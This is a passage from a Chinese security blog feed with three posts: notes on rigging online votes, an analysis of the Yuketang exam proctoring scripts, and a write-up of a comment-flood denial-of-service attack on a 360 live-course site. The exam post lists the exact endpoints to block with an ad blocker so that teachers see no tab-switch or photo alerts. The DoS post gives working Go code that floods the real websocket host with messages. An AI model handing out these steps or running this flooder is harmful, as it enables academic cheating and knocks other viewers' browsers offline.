<p>上面两个案例是成功的刷票经历，我也经历过几次失败的刷票经历，在失败的经历中，那些投票系统都是利用微信提供的用户信息验证用户身份，而微信本身对用户审核的很严（没办法伪造），我也没有多个微信号，刷票自然失败</p>
<p>实际上，刷票过程最重要的是伪造投票者身份，欺骗投票系统是不同用户进行的投票，所以投票系统防刷票最重要的就是验证用户身份</p>
<p>在实际应用中有很多验证用户身份的方法：</p>
<ul>
<li>验证手机号（发验证码的那种）</li>
<li>验证是否真人（极验、reCaptcha）</li>
<li>利用微信提供的身份</li>
</ul>
<p>对于验证手机号，刷票组织可以轻松的获取大量手机号，包括各种真号码、虚拟号码，这种方法可以轻松绕过</p>
<p>对于使用机器人验证器，绕过比较麻烦，但是也是可以通过程序绕过的，并且刷票组织有可能人力手工进行验证</p>
<p>使用微信提供的身份信息是最难搞的，因为微信本身审核的很严，提供的身份又无法伪造，这里利用的是微信对用户身份的验证，是可以信任的。但是也不是没有绕过的方法，刷票组织有时候会养了大批量的微信号用来刷票，利用群控手段也可以绕过。</p>
<p>并且，有很多刷票组织养着很多群，可以提供真人投票服务，这种刷票成本非常高，但是是无法检测的，刷票成功率100%</p>
<p>针对刷票行为，无法完全避免，我们能做的就是通过各种方式对用户身份进行验证，检查用户IP，尽量避免身份伪造</p>
<p>同时，可以对投票请求的频率等信息进行分析，因为脚本刷票投票会很集中、时间间隔会比较均匀</p>
]]></description></item><item><title>屏蔽雨课堂在线考试异常上报</title><link>https://lgf.im/posts/security/web-security/yuketang-exam-block-report/</link><pubDate>Fri, 12 Jun 2020 20:23:46 +0000</pubDate><author/><guid>https://lgf.im/posts/security/web-security/yuketang-exam-block-report/</guid><description><![CDATA[<p>学校又开始推雨课堂的在线考试功能了，在老师的配合下稍微分析了一下</p>
<p>因为都是js代码，没有用wasm，分析还是比较简单的</p>
<h2 id="切屏检测">切屏检测</h2>
<p>考试过程中，如果切换浏览器标签，返回后会有一个切屏警告，并且老师那边也会有切屏记录</p>
<p>通过实验发现如果不切换浏览器标签，使用另一个浏览器窗口或者切换其他软件都不会触发这个记录</p>
<p>相关代码如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">onchange</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">hidden</span> <span class="o">||</span> 
        <span class="mi">0</span> <span class="o">!=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">onlineProctor</span> <span class="o">||</span> 
        <span class="nx">e</span><span class="p">.</span><span class="nx">getCacheResult</span><span class="p">(),</span> <span class="nx">e</span><span class="p">.</span><span class="nx">onlineProctor</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">hidden</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nx">time1</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">uploadUnnormal</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="nx">x</span> <span class="o">&amp;&amp;</span> <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">x</span><span class="p">),</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nx">$alert</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="p">{</span>
                <span class="nx">customClass</span><span class="o">:</span> <span class="s2">&#34;alertMsg&#34;</span><span class="p">,</span>
                <span class="nx">showClose</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
                <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;系统监测到你切出了考试页面&lt;br/&gt;我们会将此行为报告你的老师&#34;</span><span class="p">,</span>
                <span class="nx">dangerouslyUseHTMLString</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                <span class="nx">confirmButtonText</span><span class="o">:</span> <span class="s2">&#34;继续考试&#34;</span><span class="p">,</span>
                <span class="nx">center</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                <span class="nx">callback</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{}</span>
            <span class="p">})</span>
        <span class="p">},</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span><span class="p">;</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><p>没有看代码之前我还猜想检查切屏可以通过focus来检查，看了代码后发现使用的是vue的 onchange 进行触发，然就在方法内检查document是否hidden</p>
<p>这样是无法检测到切换不同应用的，简直是自欺欺人啊</p>
<p>注意到检测到切标签后会触发 <code>e.uploadUnnormal(12)</code> 方法，进去看一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">uploadUnnormal</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">API</span><span class="p">.</span><span class="nx">feed_add</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">exam_id</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">exam_id</span><span class="p">,</span>
        <span class="nx">action</span><span class="o">:</span> <span class="nx">t</span>
    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{}).</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">e</span><span class="p">.</span><span class="nx">$message</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;发生错误&#34;</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>其中 <code>API.feed_add1</code> 是 <code>/online_proctor/stu/monitor/feed/add</code> 这个路径</p>
<p>也就是说切标签后会 POST 一个标号为12的action记录，抓包后也发现的确如此，也仅仅而已</p>
<h2 id="照片上传">照片上传</h2>
<p>查看请求发现图片是先上传到七牛云，然后将返回的连接发给服务器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">handleCapture</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="k">this</span><span class="p">,</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">context</span><span class="p">,</span>
        <span class="nx">n</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">video</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">isexam</span><span class="p">)</span> 
        <span class="nx">e</span><span class="p">.</span><span class="nx">drawImage</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">160</span><span class="p">,</span> <span class="mi">120</span><span class="p">);</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">drawImage</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">180</span><span class="p">),</span> <span class="k">this</span><span class="p">.</span><span class="nx">reTake</span><span class="p">)</span> 
        <span class="k">return</span> <span class="k">void</span> <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;changeReTake&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">(</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
            <span class="nx">n</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nx">b</span><span class="p">)(</span><span class="nx">e</span><span class="p">,</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">());</span>
        <span class="nx">t</span><span class="p">.</span><span class="nx">upload</span><span class="p">(</span><span class="nx">n</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
            <span class="nx">t</span><span class="p">.</span><span class="nx">image_url</span> <span class="o">=</span> <span class="nx">n</span><span class="p">,</span> 
            <span class="nx">t</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;changeReTake&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">0</span><span class="p">),</span> 
            <span class="nx">t</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;changeCanEnter&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">0</span><span class="p">),</span> 
            <span class="nx">t</span><span class="p">.</span><span class="nx">isexam</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">postRecord</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="p">})</span>
    <span class="p">},</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">upload</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">qiniuDomain</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">s</span><span class="p">.</span><span class="nx">a</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">{</span>
            <span class="nx">next</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">t</span><span class="p">.</span><span class="nx">total</span><span class="p">.</span><span class="nx">percent</span>
            <span class="p">},</span>
            <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">r</span><span class="p">({</span>
                    <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
                <span class="p">})</span>
            <span class="p">},</span>
            <span class="nx">complete</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span>
                <span class="nx">n</span><span class="p">({</span>
                    <span class="nx">url</span><span class="o">:</span> <span class="nx">r</span>
                <span class="p">})</span>
            <span class="p">}</span>
        <span class="p">};</span>
        <span class="nx">c</span><span class="p">.</span><span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">upload</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">postRecord</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">exam_id</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">examid</span><span class="p">,</span>
        <span class="nx">image_url</span><span class="o">:</span> <span class="nx">t</span><span class="p">,</span>
        <span class="nx">label</span><span class="o">:</span> <span class="nx">e</span><span class="p">,</span>
        <span class="nx">event_group_id</span><span class="o">:</span> <span class="nx">n</span><span class="p">,</span>
        <span class="nx">operator_id</span><span class="o">:</span> <span class="nx">r</span><span class="p">,</span>
        <span class="nx">action</span><span class="o">:</span> <span class="nx">i</span>
    <span class="p">};</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">API</span><span class="p">.</span><span class="nx">upload_photograph</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span>
                <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{})</span>
                <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{})</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="如何绕过">如何绕过</h2>
<p>那啥，就几个有用的url，反正都是后台请求，当做广告拦截了就行，这样老师那边就没有切屏警告和异常照片了</p>
<ul>
<li>changjiang-exam.yuketang.cn/online_proctor/stu/monitor/feed/add</li>
<li>changjiang-exam.yuketang.cn/online_proctor/stu/photograph/add</li>
<li>upload.qiniup.com</li>
<li>upload-z1.qiniup.com</li>
<li>upload-z2.qiniup.com</li>
<li>upload-na0.qiniup.com</li>
<li>upload-as0.qiniup.com</li>
</ul>
<p>插件我用的AdblockPLUS，手动添加几条规则就行，亲测好用</p>
]]></description></item><item><title>利用360直播课评论区对用户浏览器dos攻击</title><link>https://lgf.im/posts/security/web-security/dos-attack-on-360-university-user/</link><pubDate>Fri, 29 May 2020 14:01:45 +0000</pubDate><author/><guid>https://lgf.im/posts/security/web-security/dos-attack-on-360-university-user/</guid><description><![CDATA[<p>前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错</p>
<p>对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制</p>
<p>并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众</p>
<p>用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击</p>
<p>评论代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-golang" data-lang="golang"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;flag&#34;</span>
	<span class="s">&#34;log&#34;</span>
	<span class="s">&#34;net/http&#34;</span>
	<span class="s">&#34;net/url&#34;</span>
	<span class="s">&#34;os&#34;</span>
	<span class="s">&#34;os/signal&#34;</span>
	<span class="s">&#34;time&#34;</span>

	<span class="s">&#34;github.com/gorilla/websocket&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">addr</span> <span class="p">=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;addr&#34;</span><span class="p">,</span> <span class="s">&#34;trans.college.360.cn&#34;</span><span class="p">,</span> <span class="s">&#34;http service address&#34;</span><span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">flag</span><span class="p">.</span><span class="nf">Parse</span><span class="p">()</span>
	<span class="nx">log</span><span class="p">.</span><span class="nf">SetFlags</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="nx">interrupt</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Signal</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
	<span class="nx">signal</span><span class="p">.</span><span class="nf">Notify</span><span class="p">(</span><span class="nx">interrupt</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Interrupt</span><span class="p">)</span>

	<span class="nx">u</span> <span class="o">:=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">URL</span><span class="p">{</span>
		<span class="nx">Scheme</span><span class="p">:</span> <span class="s">&#34;wss&#34;</span><span class="p">,</span> 
		<span class="nx">Host</span><span class="p">:</span> <span class="o">*</span><span class="nx">addr</span><span class="p">,</span> 
		<span class="nx">Path</span><span class="p">:</span> <span class="s">&#34;/ws&#34;</span><span class="p">,</span> 
		<span class="nx">RawQuery</span><span class="p">:</span> <span class="s">&#34;live_course_id=10114&#34;</span>
	<span class="p">}</span>
	<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;connecting to %s&#34;</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>


	<span class="nx">header</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
	<span class="nx">header</span><span class="p">[</span><span class="s">&#34;Origin&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;https://admin.college.360.cn&#34;</span><span class="p">}</span>
	<span class="nx">header</span><span class="p">[</span><span class="s">&#34;User-Agent&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;Chrome/80.0.3987.122&#34;</span><span class="p">}</span>
	<span class="nx">header</span><span class="p">[</span><span class="s">&#34;Cookie&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;your cookie&#34;</span><span class="p">}</span>

	<span class="nx">dialer</span> <span class="o">:=</span> <span class="nx">websocket</span><span class="p">.</span><span class="nx">DefaultDialer</span>
	<span class="nx">dialer</span><span class="p">.</span><span class="nx">EnableCompression</span> <span class="p">=</span> <span class="kc">true</span>
	<span class="nx">c</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">dialer</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="nx">header</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;dial:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">defer</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>

	<span class="nx">done</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>

	<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">defer</span> <span class="nb">close</span><span class="p">(</span><span class="nx">done</span><span class="p">)</span>
		<span class="k">for</span> <span class="p">{</span>
			<span class="nx">_</span><span class="p">,</span> <span class="nx">message</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">ReadMessage</span><span class="p">()</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;read:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;recv: %s&#34;</span><span class="p">,</span> <span class="nx">message</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}()</span>

	<span class="nx">ticker</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">NewTicker</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="k">defer</span> <span class="nx">ticker</span><span class="p">.</span><span class="nf">Stop</span><span class="p">()</span>

	<span class="k">for</span> <span class="p">{</span>
		<span class="k">select</span> <span class="p">{</span>
		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">done</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ticker</span><span class="p">.</span><span class="nx">C</span><span class="p">:</span>
			<span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">WriteMessage</span><span class="p">(</span><span class="nx">websocket</span><span class="p">.</span><span class="nx">TextMessage</span><span class="p">,</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span>
					<span class="s">&#34;{\&#34;cmd\&#34;:\&#34;newMessage\&#34;,\&#34;message\&#34;:\&#34;感谢360\&#34;}&#34;</span>
				<span class="p">))</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;write:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">interrupt</span><span class="p">:</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;interrupt&#34;</span><span class="p">)</span>
			<span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">WriteMessage</span><span class="p">(</span>
				<span class="nx">websocket</span><span class="p">.</span><span class="nx">CloseMessage</span><span class="p">,</span> 
				<span class="nx">websocket</span><span class="p">.</span><span class="nf">FormatCloseMessage</span><span class="p">(</span>
					<span class="nx">websocket</span><span class="p">.</span><span class="nx">CloseNormalClosure</span><span class="p">,</span> <span class="s">&#34;&#34;</span>
				<span class="p">)</span>
			<span class="p">)</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;write close:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
			<span class="k">select</span> <span class="p">{</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">done</span><span class="p">:</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">time</span><span class="p">.</span><span class="nf">After</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">):</span>
			<span class="p">}</span>
			<span class="k">return</span>
		<span class="p">}</span>
